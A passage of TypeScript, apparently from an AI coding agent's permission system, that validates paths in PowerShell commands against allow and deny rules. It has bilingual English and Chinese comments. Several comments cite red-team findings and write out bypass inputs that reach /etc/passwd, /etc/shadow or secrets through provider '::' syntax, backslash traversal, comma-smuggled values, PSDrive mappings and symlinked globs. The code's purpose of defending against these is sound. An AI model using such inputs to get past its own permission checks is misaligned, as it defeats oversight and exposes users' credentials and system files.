  // Entries here are defense-in-depth for Edit-deny-rule consultation, mirroring
  // set-item's rationale.
  'set-itemproperty': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-passthru',
      '-force',
      '-whatif',
      '-confirm',
      '-usetransaction',
    ],
    knownValueParams: [
      '-name',
      '-value',
      '-type',
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-inputobject',
    ],
  },
  'new-itemproperty': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-force', '-whatif', '-confirm', '-usetransaction'],
    knownValueParams: [
      '-name',
      '-value',
      '-propertytype',
      '-type',
      '-filter',
      '-include',
      '-exclude',
      '-credential',
    ],
  },
  'remove-itemproperty': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-force', '-whatif', '-confirm', '-usetransaction'],
    knownValueParams: [
      '-name',
      '-filter',
      '-include',
      '-exclude',
      '-credential',
    ],
  },
  'clear-item': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-force', '-whatif', '-confirm', '-usetransaction'],
    knownValueParams: ['-filter', '-include', '-exclude', '-credential'],
  },
  'export-alias': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-append',
      '-force',
      '-noclobber',
      '-passthru',
      '-whatif',
      '-confirm',
    ],
    knownValueParams: ['-name', '-description', '-scope', '-as'],
  },
}

/**
 * 【中文】参数名匹配，支持 PowerShell 的**前缀缩写**（-Lit 也算 -LiteralPath）。
 *
 * 为什么要支持缩写：PowerShell 允许把参数缩到「无歧义的最短前缀」，
 * 只做全等比较的话，写 -Lit 就能绕过路径抽取 → 路径不被校验。
 *
 * @param paramLower 小写且带前导减号的参数名
 * @param paramList 待匹配的参数清单
 */
/**
 * Checks if a lowercase parameter name (with leading dash) matches any entry
 * in the given param list, accounting for PowerShell's prefix-matching behavior
 * (e.g., -Lit matches -LiteralPath).
 */
function matchesParam(paramLower: string, paramList: string[]): boolean {
// 匹配条件：`p === paramLower`（全等）或 `p.startsWith(paramLower)`（前缀缩写）。
// 注意 paramLower.length > 1 的守卫：否则裸 '-' 会匹配一切参数。
  for (const p of paramList) {
    if (
      p === paramLower ||
      (paramLower.length > 1 && p.startsWith(paramLower))
    ) {
      return true
    }
  }
  return false
}

/**
 * 【中文】冒号绑定值里是否藏着「表达式」（数组、子表达式、变量、反引号转义…）。
 *
 * 为什么需要：外层 CommandParameterAst 的元素类型统一是 'Parameter'，
 * 把里面真实的类型**遮住**了 —— 光看类型识别不出 -Path:$env:X。
 * 所以只能退回来看文本特征。
 */
/**
 * Returns true if a colon-syntax value contains expression constructs that
 * mask the real runtime path (arrays, subexpressions, variables, backtick
 * escapes). The outer CommandParameterAst 'Parameter' element type hides
 * these from our AST walk, so we must detect them textually.
 *
 * Used in three branches of extractPathsFromCommand: pathParams,
 * leafOnlyPathParams, and the unknown-param defense-in-depth branch.
 */
function hasComplexColonValue(rawValue: string): boolean {
  return (
    rawValue.includes(',') ||
    rawValue.startsWith('(') ||
    rawValue.startsWith('[') ||
    rawValue.includes('`') ||
    rawValue.includes('@(') ||
    rawValue.startsWith('@{') ||
    rawValue.includes('$')
  )
}

/**
 * 【中文】把目录列表格式化成人类可读的文案（超过 5 个就只列前 5 个 + 「还有 N 个」）。
 */
function formatDirectoryList(directories: string[]): string {
  const dirCount = directories.length
  if (dirCount <= MAX_DIRS_TO_LIST) {
    return directories.map(dir => `'${dir}'`).join(', ')
  }
  const firstDirs = directories
    .slice(0, MAX_DIRS_TO_LIST)
    .map(dir => `'${dir}'`)
    .join(', ')
  return `${firstDirs}, and ${dirCount - MAX_DIRS_TO_LIST} more`
}

/**
 * 【中文】把路径开头的 ~ 展开成用户 home 目录。
 * 只处理**开头**的 ~（中间的 ~ 是普通字符）。
 */
/**
 * Expands tilde (~) at the start of a path to the user's home directory.
 */
function expandTilde(filePath: string): string {
  if (
    filePath === '~' ||
    filePath.startsWith('~/') ||
    filePath.startsWith('~\\')
  ) {
    return homedir() + filePath.slice(1)
  }
  return filePath
}

/**
 * 【中文】用**原始形态**（未经 realpath 解析）判断这是不是危险的删除目标。
 *
 * 为什么不能只用解析后的路径（对应上方英文注释）：
 * realpath 会把 '/' 规范化成 'C:\'（Windows），或把 /var/... 重写成
 * /private/var/...（macOS）—— 于是那些基于字符串比较的判断（=== '/'、
 * === homedir()）全部失配。所以要在「用户敲的那个样子」上再判一次。
 */
/**
 * Checks the raw user-provided path (pre-realpath) for dangerous removal
 * targets. safeResolvePath/realpathSync canonicalizes in ways that defeat
 * isDangerousRemovalPath: on Windows '/' → 'C:\' (fails the === '/' check);
 * on macOS homedir() may be under /var which realpathSync rewrites to
 * /private/var (fails the === homedir() check). Checking the tilde-expanded,
 * backslash-normalized form catches the dangerous shapes (/, ~, /etc, /usr)
 * as the user typed them.
 */
export function isDangerousRemovalRawPath(filePath: string): boolean {
  const expanded = expandTilde(filePath.replace(/^['"]|['"]$/g, '')).replace(
    /\\/g,
    '/',
  )
  return isDangerousRemovalPath(expanded)
}

/**
 * 【中文】构造「删除系统关键路径被硬拒绝」的结果（deny，用户无法批准）。
 * 对应 BashTool 里对 `rm /`、`rm ~`、`rm /etc` 的无条件拦截。
 */
export function dangerousRemovalDeny(path: string): PermissionResult {
  return {
    behavior: 'deny',
    message: `Remove-Item on system path '${path}' is blocked. This path is protected from removal.`,
    decisionReason: {
      type: 'other',
      reason: 'Removal targets a protected system path',
    },
  }
}

/**
 * 【中文】**裁决单个已解析路径**是否允许（本文件的决策核心）。
 *
 * @param resolvedPath 已 realpath 解析过的绝对路径
 * @param operationType 读/写/创建 —— 决定按 read 还是 edit 权限去匹配规则
 * @param precomputedPathsToCheck 预先算好的待检查路径（性能优化，可省则省）
 * @returns { allowed, decisionReason? }
 *
 * 判定顺序（**顺序本身就是安全策略**）：
 *   ① deny 规则命中 → 直接不允许（deny 优先级最高）
 *   ② 写操作：先查「内部可编辑路径」（plan 文件、便签、agent 记忆、任务目录）
 *      必须排在安全性检查**之前** —— 因为这些 internal 路径都在 ~/.claude/ 下，
 *      而 .claude 又属于「危险目录」，顺序反了就永远轮不到它们。
 *   ③ 写操作：安全性检查（checkPathSafetyForAutoEdit）
 *   ④ 在允许的工作目录内：读操作直接放行；写操作仅 acceptEdits 模式放行
 *   ⑤ 读操作：查「内部可读路径」
 *   ⑥ 写操作且路径在工作目录**之外**：查 sandbox 写白名单
 *      （工作目录内的要排除，因为白名单总会包含 cwd 本身，会把第 ④ 步的闸门绕过）
 *   ⑦ allow 规则命中 → 允许
 *   ⑧ 都不命中 → 不允许（fail-closed）
 */
/**
 * Checks if a resolved path is allowed for the given operation type.
 * Mirrors the logic in BashTool/pathValidation.ts isPathAllowed.
 */
function isPathAllowed(
  resolvedPath: string,
  context: ToolPermissionContext,
  operationType: FileOperationType,
  precomputedPathsToCheck?: readonly string[],
): PathCheckResult {
// 只有 read 才按「读权限」匹配规则，write/create 都按「编辑权限」匹配。
  const permissionType = operationType === 'read' ? 'read' : 'edit'

  // 1. Check deny rules first
  const denyRule = matchingRuleForInput(
    resolvedPath,
    context,
    permissionType,
    'deny',
  )
  if (denyRule !== null) {
    return {
      allowed: false,
      decisionReason: { type: 'rule', rule: denyRule },
    }
  }

// 顺序要点（对应上方英文注释）：internal 可编辑路径都在 ~/.claude/ 下面，
// 而 .claude 本身属于「危险目录」—— 如果先做安全性检查，这些路径就永远
// 走不到「允许」这一步。所以必须**先**查 internal。
  // 2. For write/create operations, check internal editable paths (plan files, scratchpad, agent memory, job dirs)
  // This MUST come before checkPathSafetyForAutoEdit since .claude is a dangerous directory
  // and internal editable paths live under ~/.claude/ — matching the ordering in
  // checkWritePermissionForTool (filesystem.ts step 1.5)
  if (operationType !== 'read') {
    const internalEditResult = checkEditableInternalPath(resolvedPath, {})
    if (internalEditResult.behavior === 'allow') {
      return {
        allowed: true,
        decisionReason: internalEditResult.decisionReason,
      }
    }
  }

  // 2.5. For write/create operations, check safety validations
  if (operationType !== 'read') {
    const safetyCheck = checkPathSafetyForAutoEdit(
      resolvedPath,
      precomputedPathsToCheck,
    )
    if (!safetyCheck.safe) {
      return {
        allowed: false,
        decisionReason: {
          type: 'safetyCheck',
          reason: safetyCheck.message,
          classifierApprovable: safetyCheck.classifierApprovable,
        },
      }
    }
  }

// 工作目录内：读直接放行；写只在 acceptEdits 模式放行（编辑要用户授权）。
  // 3. Check if path is in allowed working directory
  const isInWorkingDir = pathInAllowedWorkingPath(
    resolvedPath,
    context,
    precomputedPathsToCheck,
  )
  if (isInWorkingDir) {
    if (operationType === 'read' || context.mode === 'acceptEdits') {
      return { allowed: true }
    }
  }

  // 3.5. For read operations, check internal readable paths
  if (operationType === 'read') {
    const internalReadResult = checkReadableInternalPath(resolvedPath, {})
    if (internalReadResult.behavior === 'allow') {
      return {
        allowed: true,
        decisionReason: internalReadResult.decisionReason,
      }
    }
  }

// sandbox 写白名单：用户显式配置过的可写目录（如 /tmp/claude/），
// 重定向 / Out-File / New-Item 写到那里不该反复弹框。
// 但**仅限工作目录之外** —— 白名单默认包含 cwd，若不排除就会绕过第 ④ 步的闸门。
  // 3.7. For write/create operations to paths OUTSIDE the working directory,
  // check the sandbox write allowlist. When the sandbox is enabled, users
  // have explicitly configured writable directories (e.g. /tmp/claude/) —
  // treat these as additional allowed write directories so redirects/Out-File/
  // New-Item don't prompt unnecessarily. Paths IN the working directory are
  // excluded: the sandbox allowlist always seeds '.' (cwd), which would
  // bypass the acceptEdits gate at step 3.
  if (
    operationType !== 'read' &&
    !isInWorkingDir &&
    isPathInSandboxWriteAllowlist(resolvedPath)
  ) {
    return {
      allowed: true,
      decisionReason: {
        type: 'other',
        reason: 'Path is in sandbox write allowlist',
      },
    }
  }

  // 4. Check allow rules
  const allowRule = matchingRuleForInput(
    resolvedPath,
    context,
    permissionType,
    'allow',
  )
  if (allowRule !== null) {
    return {
      allowed: true,
      decisionReason: { type: 'rule', rule: allowRule },
    }
  }

  // 5. Path is not allowed
  return { allowed: false }
}

/**
 * 【中文】对「勉强猜出来」的路径只做 deny 规则匹配 —— **绝不**自动放行。
 *
 * 用在哪：被 :: 或反引号遮蔽的路径，我们猜不出真实值，
 * 但至少要看看它有没有撞上显式的 deny 规则。
 * 猜错了（没匹配上 deny）就返回 null，调用方照旧走 ask —— 安全边界没被削弱。
 */
/**
 * Best-effort deny check for paths obscured by :: or backtick syntax.
 * ONLY checks deny rules — never auto-allows. If the stripped guess
 * doesn't match a deny rule, we fall through to ask as before.
 */
function checkDenyRuleForGuessedPath(
  strippedPath: string,
  cwd: string,
  toolPermissionContext: ToolPermissionContext,
  operationType: FileOperationType,
): { resolvedPath: string; rule: PermissionRule } | null {
  // Red-team P7: null bytes make expandPath throw. Pre-existing but
  // defend here since we're introducing a new call path.
// 空字符串或含空字节（\0）会让后面的展开函数抛异常，先挡掉。
  if (!strippedPath || strippedPath.includes('\0')) return null
// 坑点：expandTilde 只认**开头**的 ~，而 `~/.ssh/x` 里反引号在 ~ 前面，
// 所以这里必须**再跑一次**展开 —— 否则漏判。
  // Red-team P3: `~/.ssh/x strips to ~/.ssh/x but expandTilde only fires
  // on leading ~ — the backtick was in front of it. Re-run here.
  const tildeExpanded = expandTilde(strippedPath)
  const abs = isAbsolute(tildeExpanded)
    ? tildeExpanded
    : resolve(cwd, tildeExpanded)
  const { resolvedPath } = safeResolvePath(getFsImplementation(), abs)
  const permissionType = operationType === 'read' ? 'read' : 'edit'
  const denyRule = matchingRuleForInput(
    resolvedPath,
    toolPermissionContext,
    permissionType,
    'deny',
  )
  return denyRule ? { resolvedPath, rule: denyRule } : null
}

/**
 * 【中文】校验一个文件路径（本文件最「硬核」的函数）。
 *
 * @param filePath 从命令里抽出来的原始路径文本
 * @param cwd 当前工作目录（相对路径的解析基准）
 * @param operationType 读/写/创建
 * @returns { allowed, resolvedPath, decisionReason? }
 *
 * 流程：先做归一化（去引号 → ~ 展开 → 反斜杠转正斜杠），
 * 然后**依次挡掉**几类「静态上看不懂」的形式（每类都先尝试查 deny 规则）：
 *   ① 含反引号（PowerShell 的转义符，能让 isAbsolute 之类的检查失准）
 *   ② 含 ::（模块限定 provider 路径，如 FileSystem::/etc/passwd）
 *   ③ UNC 路径（会触发网络请求、泄漏 NTLM/Kerberos 凭据）
 *   ④ 含 $ 或 %（变量展开）
 *   ⑤ 非文件系统 provider（env: / HKLM: / PSDrive: 等）
 *   ⑥ 通配符（写操作一律拒绝；读操作只查基目录的 deny 规则）
 * 最后才 realpath 解析并交给 isPathAllowed 裁决。
 */
/**
 * Validates a file system path, handling tilde expansion.
 */
function validatePath(
  filePath: string,
  cwd: string,
  toolPermissionContext: ToolPermissionContext,
  operationType: FileOperationType,
): ResolvedPathCheckResult {
  // Remove surrounding quotes if present
  const cleanPath = expandTilde(filePath.replace(/^['"]|['"]$/g, ''))

// 为什么要把反斜杠统一成正斜杠：PowerShell Core 在所有平台上都会把 \ 归一化成 /，
// 但 Node 的 path.resolve 在 Linux/Mac 上把 \ 当**普通字符** ——
// 不归一化的话 `dir\..\..\etc\shadow` 这种遍历就看不出来。
  // SECURITY: PowerShell Core normalizes backslashes to forward slashes on all
  // platforms, but path.resolve on Linux/Mac treats them as literal characters.
  // Normalize before resolution so traversal patterns like dir\..\..\etc\shadow
  // are correctly detected.
  const normalizedPath = cleanPath.replace(/\\/g, '/')

// 反引号 ` 是 PowerShell 的转义符。它在很多位置是空操作（`/ 就等于 /），
// 但会让 Node 的 isAbsolute() 之类判断失准。而且重定向目标用的是原始
// .Extent.Text（保留反引号）。结论：含反引号的路径一律视为不可静态判定。
  // SECURITY: Backtick (`) is PowerShell's escape character. It is a no-op in
  // many positions (e.g., `/ === /) but defeats Node.js path checks like
  // isAbsolute(). Redirection targets use raw .Extent.Text which preserves
  // backtick escapes. Treat any path containing a backtick as unvalidatable.
  if (normalizedPath.includes('`')) {
    // Red-team P3: backtick is already resolved for StringConstant args
    // (parser uses .value); this guard primarily fires for redirection
    // targets which use raw .Extent.Text. Strip is a no-op for most special
    // escapes (`n → n) but that's fine — wrong guess → no deny match →
    // falls to ask.
    const backtickStripped = normalizedPath.replace(/`/g, '')
    const denyHit = checkDenyRuleForGuessedPath(
      backtickStripped,
      cwd,
      toolPermissionContext,
      operationType,
    )
    if (denyHit) {
      return {
        allowed: false,
        resolvedPath: denyHit.resolvedPath,
        decisionReason: { type: 'rule', rule: denyHit.rule },
      }
    }
    return {
      allowed: false,
      resolvedPath: normalizedPath,
      decisionReason: {
        type: 'other',
        reason:
          'Backtick escape characters in paths cannot be statically validated and require manual approval',
      },
    }
  }

// `FileSystem::/etc/passwd` 这种 provider 限定路径：:: 是 provider 分隔符，
// 简单的 `^[a-z]{2,}:` 正则匹配不到它 —— 所以要单独处理：
// 剥掉第一个 :: 及其之前的全部内容，拿剩下的去查 deny 规则。
// 有双 :: 的情况（Foo::Bar::/x）只剥第一个，剩下的解析出来是 {cwd}/Bar::/x，
// 匹配不到真实 deny 规则 → 落到 ask。虽然不精确，但方向是安全的。
  // SECURITY: Block module-qualified provider paths. PowerShell allows
  // `Microsoft.PowerShell.Core\FileSystem::/etc/passwd` which resolves to
  // `/etc/passwd` via the FileSystem provider. The `::` is the provider
  // path separator and doesn't match the simple `^[a-z]{2,}:` regex.
  if (normalizedPath.includes('::')) {
    // Strip everything up to and including the first :: — handles both
    // FileSystem::/path and Microsoft.PowerShell.Core\FileSystem::/path.
    // Double-:: (Foo::Bar::/x) strips first only → 'Bar::/x' → resolve
    // makes it {cwd}/Bar::/x → won't match real deny rules → falls to ask.
    // Safe.
    const afterProvider = normalizedPath.slice(normalizedPath.indexOf('::') + 2)
    const denyHit = checkDenyRuleForGuessedPath(
      afterProvider,
      cwd,
      toolPermissionContext,
      operationType,
    )
    if (denyHit) {
      return {
        allowed: false,
        resolvedPath: denyHit.resolvedPath,
        decisionReason: { type: 'rule', rule: denyHit.rule },
      }
    }
    return {
      allowed: false,
      resolvedPath: normalizedPath,
      decisionReason: {
        type: 'other',
        reason:
          'Module-qualified provider paths (::) cannot be statically validated and require manual approval',
      },
    }
  }

// UNC 路径（\\server\share）会触发网络请求，还可能泄漏 NTLM/Kerberos 凭据，
// 一律拒绝。DavWWWRoot / @SSL@ 是 WebDAV 相关的两种特殊 UNC 形态，一并挡掉。
  // SECURITY: Block UNC paths — they can trigger network requests and
  // leak NTLM/Kerberos credentials
  if (
    normalizedPath.startsWith('//') ||
    /DavWWWRoot/i.test(normalizedPath) ||
    /@SSL@/i.test(normalizedPath)
  ) {
    return {
      allowed: false,
      resolvedPath: normalizedPath,
      decisionReason: {
        type: 'other',
        reason:
          'UNC paths are blocked because they can trigger network requests and credential leakage',
      },
    }
  }

  // SECURITY: Reject paths containing shell expansion syntax
  if (normalizedPath.includes('$') || normalizedPath.includes('%')) {
    return {
      allowed: false,
      resolvedPath: normalizedPath,
      decisionReason: {
        type: 'other',
        reason: 'Variable expansion syntax in paths requires manual approval',
      },
    }
  }

// 非文件系统 provider 路径（env: / HKLM: / alias: / function: / 以及 PSDrive）。
// 平台差异是关键（对应上方英文注释）：
//   Windows：要求冒号前至少 2 个字符 —— 好让 C:、D: 这种**盘符**正常通过；
//   POSIX ：任何 <字母数字>: 前缀都视为 PSDrive（单字母盘符在 Linux/macOS 上
//           没有原生含义）。因为 `New-PSDrive -Name Z -Root /etc` 之后
//           `Get-Content Z:/secrets` 会被 resolve 成 {cwd}/Z:/secrets（在 cwd 内！），
//           从而绕过 Read(/etc/**) 的 deny 规则。我们无法静态知道 PSDrive 指向哪。
// 注意字符类用 [a-z0-9]（混合也算）：早期写法 [a-z]{2,}|[0-9]+ 漏掉了 a1:、1a:。
  // SECURITY: Block non-filesystem provider paths (env:, HKLM:, alias:, function:, etc.)
  // These paths access non-filesystem resources and must require manual approval.
  // This catches colon-syntax like -Path:env:HOME where the extracted value is 'env:HOME'.
  //
  // Platform split (findings #21/#28):
  // - Windows: require 2+ letters before ':' so native drive letters (C:, D:)
  //   pass through to path.win32.isAbsolute/resolve which handle them correctly.
  // - POSIX: ANY <letters>: prefix is a PowerShell PSDrive — single-letter drive
  //   paths have no native meaning on Linux/macOS. `New-PSDrive -Name Z -Root /etc`
  //   then `Get-Content Z:/secrets` would otherwise resolve via
  //   path.posix.resolve(cwd, 'Z:/secrets') → '{cwd}/Z:/secrets' → inside cwd →
  //   allowed, bypassing Read(/etc/**) deny rules. We cannot statically know what
  //   filesystem root a PSDrive maps to, so treat all drive-prefixed paths on
  //   POSIX as unvalidatable.
  // Include digits in PSDrive name (bug #23): `New-PSDrive -Name 1 ...`
  // creates drive `1:` — a valid PSDrive path prefix.
  // Windows regex requires 2+ chars to exclude single-letter native drive letters
  // (C:, D:). Use a single character class [a-z0-9] to catch mixed alphanumeric
  // PSDrive names like `a1:`, `1a:` — the previous alternation `[a-z]{2,}|[0-9]+`
  // missed those since `a1` is neither pure letters nor pure digits.
// 两处正则的唯一差别就是「冒号前要几个字符」：Windows 要 2+（排除盘符），
// POSIX 要 1+（任何前缀都当 PSDrive）。
  const providerPathRegex =
    getPlatform() === 'windows' ? /^[a-z0-9]{2,}:/i : /^[a-z0-9]+:/i
  if (providerPathRegex.test(normalizedPath)) {
    return {
      allowed: false,
      resolvedPath: normalizedPath,
      decisionReason: {
        type: 'other',
        reason: `Path '${normalizedPath}' uses a non-filesystem provider and requires manual approval`,
      },
    }
  }

// ===== 通配符处理 ===== 写操作一律拒绝通配符（必须给确定的文件路径）；
// 读操作分三种情况处理（见下面三段）。
  // SECURITY: Block glob patterns in write/create operations
  if (GLOB_PATTERN_REGEX.test(normalizedPath)) {
    if (operationType === 'write' || operationType === 'create') {
      return {
        allowed: false,
        resolvedPath: normalizedPath,
        decisionReason: {
          type: 'other',
          reason:
            'Glob patterns are not allowed in write operations. Please specify an exact file path.',
        },
      }
    }

    // For read operations with path traversal (e.g., /project/*/../../../etc/shadow),
    // resolve the full path (including glob chars) and validate that resolved path.
    // This catches patterns that escape the working directory via `..` after the glob.
// 读操作 + 带 .. 遍历：把**含通配符的整条路径**解析一遍再校验 ——
// 这样能抓住 `/project/*/../../../etc/shadow` 这种「通配符后面再逃逸」的写法。
    if (containsPathTraversal(normalizedPath)) {
      const absolutePath = isAbsolute(normalizedPath)
        ? normalizedPath
        : resolve(cwd, normalizedPath)
      const { resolvedPath, isCanonical } = safeResolvePath(
        getFsImplementation(),
        absolutePath,
      )
      const result = isPathAllowed(
        resolvedPath,
        toolPermissionContext,
        operationType,
        isCanonical ? [resolvedPath] : undefined,
      )
      return {
        allowed: result.allowed,
        resolvedPath,
        decisionReason: result.decisionReason,
      }
    }

// 读操作 + 普通通配符（finding #15）：通配符**展开后**可能命中符号链接，
// 例：/project/*/passwd，而 /project/link 是指向 /etc 的链接 ——
// 基目录 /project 看起来安全，运行时 * 展开成 link，实际读的是 /etc/passwd。
// 静态无法穷举（那需要真的去展开 glob，而且还有 TOCTOU 竞争）。
// 所以只对**基目录**查 deny 规则（让显式的 Read(/project/**) 生效），
// 没命中就强制 ask。
    // SECURITY (finding #15): Glob patterns for read operations cannot be
    // statically validated. getGlobBaseDirectory returns the directory before
    // the first glob char; only that base is realpathed. Anything matched by
    // the glob (including symlinks) is never examined. Example:
    //   /project/*/passwd with symlink /project/link → /etc
    // Base dir is /project (allowed), but runtime expands * to 'link' and
    // reads /etc/passwd. We cannot validate symlinks inside glob expansion
    // without actually expanding the glob (requires filesystem access and
    // still races with attacker creating symlinks post-validation).
    //
    // Still check deny rules on the base directory so explicit Read(/project/**)
    // deny rules fire. If no deny matches, force ask.
    const basePath = getGlobBaseDirectory(normalizedPath)
    const absoluteBasePath = isAbsolute(basePath)
      ? basePath
      : resolve(cwd, basePath)
    const { resolvedPath } = safeResolvePath(
      getFsImplementation(),
      absoluteBasePath,
    )
    const permissionType = operationType === 'read' ? 'read' : 'edit'
    const denyRule = matchingRuleForInput(
      resolvedPath,
      toolPermissionContext,
      permissionType,
      'deny',
    )
    if (denyRule !== null) {
      return {
        allowed: false,
        resolvedPath,
        decisionReason: { type: 'rule', rule: denyRule },
      }
    }
    return {
      allowed: false,
      resolvedPath,
      decisionReason: {
        type: 'other',
        reason:
          'Glob patterns in paths cannot be statically validated — symlinks inside the glob expansion are not examined. Requires manual approval.',
      },
    }
  }

// 走到这里说明路径是「干净且确定」的，可以放心 realpath 解析 + 裁决了。
  // Resolve path
  const absolutePath = isAbsolute(normalizedPath)
    ? normalizedPath
    : resolve(cwd, normalizedPath)
// safeResolvePath：解析符号链接，同时返回 isCanonical 表示「是否解析成功」。
// 解析成功才把结果传给下层做「预计算路径」（省一次重复计算）。
  const { resolvedPath, isCanonical } = safeResolvePath(
    getFsImplementation(),
    absolutePath,
  )

  const result = isPathAllowed(
    resolvedPath,
    toolPermissionContext,
    operationType,
    isCanonical ? [resolvedPath] : undefined,
  )
  return {
    allowed: result.allowed,
    resolvedPath,
    decisionReason: result.decisionReason,
  }
}

/**
 * 【中文】取通配符**之前**的目录部分（glob 的「基目录」）。
 * 例：/project/*/passwd → /project/
 */
function getGlobBaseDirectory(filePath: string): string {
  const globMatch = filePath.match(GLOB_PATTERN_REGEX)
  if (!globMatch || globMatch.index === undefined) {
    return filePath
  }
  const beforeGlob = filePath.substring(0, globMatch.index)
  const lastSepIndex = Math.max(
    beforeGlob.lastIndexOf('/'),
    beforeGlob.lastIndexOf('\\'),
  )
  if (lastSepIndex === -1) return '.'
  return beforeGlob.substring(0, lastSepIndex + 1) || '/'
}

/**
 * 【中文】允许当作「字面路径」抽取的元素类型白名单：只有 StringConstant 和 Parameter。
 *
 * 为什么这么严：Variable / ExpandableString 的值**运行时**才确定，
 * 虽然下游还有兜底（validatePath 里的 $ 检测、hasExpandableStrings 安全标记），
 * 但这里就挡掉属于「在最早的闸门就 fail-safe」，不把宝押在下游。
 */
/**
 * Element types that are safe to extract as literal path strings.
 *
 * Only element types with statically-known string values are safe for path
 * extraction. Variable and ExpandableString have runtime-determined values —
 * even though they're defended downstream ($ detection in validatePath's
 * `includes('$')` check, and the hasExpandableStrings security flag), excluding
 * them here is defense-in-direct: fail-safe at the earliest gate rather than
 * relying on downstream checks to catch them.
 *
 * Any other type (e.g., 'Other' for ArrayLiteralExpressionAst, 'SubExpression',
 * 'ScriptBlock', 'Variable', 'ExpandableString') cannot be statically validated
 * and must force an ask.
 */
const SAFE_PATH_ELEMENT_TYPES = new Set<string>(['StringConstant', 'Parameter'])

/**
 * 【中文】**抽取阶段核心**：从一个命令元素里摘出所有文件路径。
 *
 * @param cmd 单个命令元素（name / args / elementTypes）
 * @returns paths 抽出的路径列表；
 *          operationType 该 cmdlet 的读/写性质；
 *          hasUnvalidatablePathArg 是否遇到了看不懂的参数（调用方据此强制 ask）；
 *          optionalWrite 是否只在有路径参数时才写盘
 *
 * 逐参数扫描的规则（按优先级）：
 *   ① 是 pathParams        → 取它的值（空格式取下一个 token，冒号式取冒号后）
 *   ② 是 leafOnlyPathParams→ 同样取值，但只接受「纯叶子名」，否则标记不可判定
 *   ③ 是 knownSwitches     → 什么都不做（开关不吃值）
 *   ④ 是 knownValueParams  → 吃掉它的值，不当路径校验，但要检查元素类型
 *   ⑤ 都不认识            → 标记不可判定（并尝试从冒号语法里抢救出值去查 deny）
 *   ⑥ 非参数（位置参数）  → 当作路径（除非落在 positionalSkip 范围内）
 */
/**
 * Extract file paths from a parsed PowerShell command element.
 * Uses the AST args to find positional and named path parameters.
 *
 * If any path argument has a complex elementType (e.g., array literal,
 * subexpression) that cannot be statically validated, sets
 * hasUnvalidatablePathArg so the caller can force an ask.
 */
function extractPathsFromCommand(cmd: ParsedCommandElement): {
  paths: string[]
  operationType: FileOperationType
  hasUnvalidatablePathArg: boolean
  optionalWrite: boolean
} {
  const canonical = resolveToCanonical(cmd.name)
  const config = CMDLET_PATH_CONFIG[canonical]

// 查不到配置 → 返回空路径 + 'read'：不是错误，只是「这个 cmdlet 不涉及路径校验」。
// 注意这不会放行任何东西（paths 为空就是什么都不校验），只是把责任交回上层。
  if (!config) {
    return {
      paths: [],
      operationType: 'read',
      hasUnvalidatablePathArg: false,
      optionalWrite: false,
    }
  }

// 通用参数（-Verbose / -ErrorAction…）**不写在这张表里**，而是在这里合并进来。
// 好处：一张表维护一次，所有 cmdlet 都受益；也避免表变得又长又重复。
  // Build per-cmdlet known-param sets, merging in common parameters.
  const switchParams = [...config.knownSwitches, ...COMMON_SWITCHES]
  const valueParams = [...config.knownValueParams, ...COMMON_VALUE_PARAMS]

  const paths: string[] = []
  const args = cmd.args
// 下标错位提醒：elementTypes[0] 是命令名，所以 elementTypes[i+1] 才对应 args[i]。
// 本函数里到处是 +1 / +2，改动时务必整体核对。
  // elementTypes[0] is the command name; elementTypes[i+1] corresponds to args[i]
  const elementTypes = cmd.elementTypes
  let hasUnvalidatablePathArg = false
  let positionalsSeen = 0
  const positionalSkip = config.positionalSkip ?? 0

// 检查某个位置参数的元素类型是否「可静态判定」，不行就打标记。
  function checkArgElementType(argIdx: number): void {
    if (!elementTypes) return
    const et = elementTypes[argIdx + 1]
    if (et && !SAFE_PATH_ELEMENT_TYPES.has(et)) {
      hasUnvalidatablePathArg = true
    }
  }

  // Extract named parameter values (e.g., -Path "C:\foo")
  for (let i = 0; i < args.length; i++) {
    const arg = args[i]
    if (!arg) continue

    // Check if this arg is a parameter name.
// 判断「这是不是参数名」要以 **elementTypes 为准**（AST 的地面真相）：
// PowerShell 认 en-dash / em-dash / horizontal-bar 当参数前缀，
// 朴素的 startsWith('-') 会漏掉 `–Path` 这种写法。
// 而且它能正确区分带引号的 \「-Include\」（那是字符串常量，不是参数）。
    // SECURITY: Use elementTypes as ground truth. PowerShell's tokenizer
    // accepts en-dash/em-dash/horizontal-bar (U+2013/2014/2015) as parameter
    // prefixes; a raw startsWith('-') check misses `–Path` (en-dash). The
    // parser maps CommandParameterAst → 'Parameter' regardless of dash char.
    // isPowerShellParameter also correctly rejects quoted "-Include"
    // (StringConstant, not a parameter).
    const argElementType = elementTypes ? elementTypes[i + 1] : undefined
    if (isPowerShellParameter(arg, argElementType)) {
// 冒号语法 -Path:C:\secret 是**一整个 token**，值就藏在冒号后面。
// 先把可能存在的 Unicode 破折号归一化成 ASCII 减号（表里存的是 ASCII -）。
      // Handle colon syntax: -Path:C:\secret
      // Normalize Unicode dash to ASCII `-` (pathParams are stored with `-`).
      const normalized = '-' + arg.slice(1)
      const colonIdx = normalized.indexOf(':', 1) // skip first char (the dash)
      const paramName =
        colonIdx > 0 ? normalized.substring(0, colonIdx) : normalized
      const paramLower = paramName.toLowerCase()

// 命中路径参数：取它的值。
      if (matchesParam(paramLower, config.pathParams)) {
        // Known path parameter — extract its value as a path.
        let value: string | undefined
        if (colonIdx > 0) {
          // Colon syntax: -Path:value — the whole thing is one element.
// 安全要点：逗号分隔的多个值（-Path:safe.txt,/etc/passwd）在 AST 里是
// ArrayLiteralExpressionAst，**但我们只看到一个字符串**。
// PowerShell 会写到所有路径上 —— 所以一旦值里有逗号等复杂特征就标记不可判定。
          // SECURITY: comma-separated values (e.g., -Path:safe.txt,/etc/passwd)
          // produce ArrayLiteralExpressionAst inside the CommandParameterAst.
          // PowerShell writes to ALL paths, but we see a single string.
          const rawValue = arg.substring(colonIdx + 1)
          if (hasComplexColonValue(rawValue)) {
            hasUnvalidatablePathArg = true
          } else {
            value = rawValue
          }
        } else {
          // Standard syntax: -Path value
          const nextVal = args[i + 1]
          const nextType = elementTypes ? elementTypes[i + 2] : undefined
